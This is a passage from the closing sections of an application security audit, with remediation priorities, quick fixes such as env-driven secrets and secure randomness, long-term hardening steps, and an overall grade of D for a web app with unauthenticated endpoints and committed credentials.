6. **Enable Jinja2 autoescaping and lock down the biodata preview/PDF endpoints** (C9).
7. **Fix `SECRET_KEY`, `JWT_SECRET_KEY`, and `DEBUG`** to be env-driven with no insecure defaults (C1, C2, C3).
8. **Wire `setup_security_middleware(app)` into `main.py`** (H2) — it's already written.
9. **Sanitize the PDF-upload filename** (H4).
10. **Add rate limiting to `/auth/refresh`, CAPTCHA endpoints, and the forgot-password flow** (M2, M3, M4).

## Quick Wins (<30 min each)

- Add `backups/` and `*.sql` to `.gitignore`.
- Add one line to `main.py`: `setup_security_middleware(app)`.
- Change `DEBUG = True` → `DEBUG = config("DEBUG", default=False, cast=bool)`.
- Remove the hardcoded default from `JWT_SECRET_KEY` and `SECRET_KEY` (`config("...")`  with no default — fails loudly if unset, which is what you want).
- Delete `api/controllers/auth_controller.py` (dead code, can't even import successfully).
- Remove `PyJWT` from `requirements.txt` (unused).
- Pin `google-genai` to an exact version.
- Swap `random.choices` → `secrets.choice` in `captcha_service.py`.

## Long-Term Improvements

- Decide definitively whether Django is ORM-only or should serve real traffic — either mount its ASGI app properly or strip its now-misleading security settings.
- Consolidate the three duplicated CORS configurations into one env-driven source of truth.
- Move dependency management to a lockfile with hash-pinning (`pip-compile --generate-hashes` + `--require-hashes`).
- Give every auth-adjacent endpoint (refresh, CAPTCHA, forgot-password) its own independent rate-limit counter rather than relying on the login-specific `LoginAttempt` table.
- Define the missing `OTP_*` Django settings explicitly, and add a startup assertion that `OTP_DEBUG_MODE` can never be `True` when `DEBUG` is `False`.
- Consider adding a CI pipeline (none exists today) that runs `pip-audit`/`safety` on every dependency change, and a pre-commit hook that blocks committing `.sql`/`.env` files.

## Overall Security Grade: D

Good bones in the newer auth code, undermined by unauthenticated high-privilege endpoints, live hardcoded production credentials, and committed real data — all independently exploitable without credentials today.
